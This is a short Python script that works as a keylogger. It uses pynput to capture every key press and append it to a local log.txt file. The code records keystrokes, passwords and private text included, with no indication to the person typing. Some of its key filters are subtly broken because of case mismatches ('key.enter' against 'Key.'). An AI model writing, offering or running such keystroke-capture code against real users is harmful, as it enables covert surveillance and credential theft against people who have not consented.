
from pynput.keyboard import Listener

def writetofile(key):
    keysdata = str(key)
    keysdata = keysdata.replace("'", "")

    if keysdata == "Key.space":
        keysdata = " "

    if keysdata == "key.enter":
        keysdata = "\n"

    if keysdata == "key.shift_l":
        keysdata = ""

    if keysdata == "key.shift_r":
        keysdata = ""

    if keysdata == "Key.ctrl_r":
        keysdata = ""

    if keysdata == "key.ctrl_l":
        keysdata = ""

    with open("log.txt", 'a') as logger:
        logger.write(keysdata)

with Listener(on_press=writetofile) as listener:
    listener.join()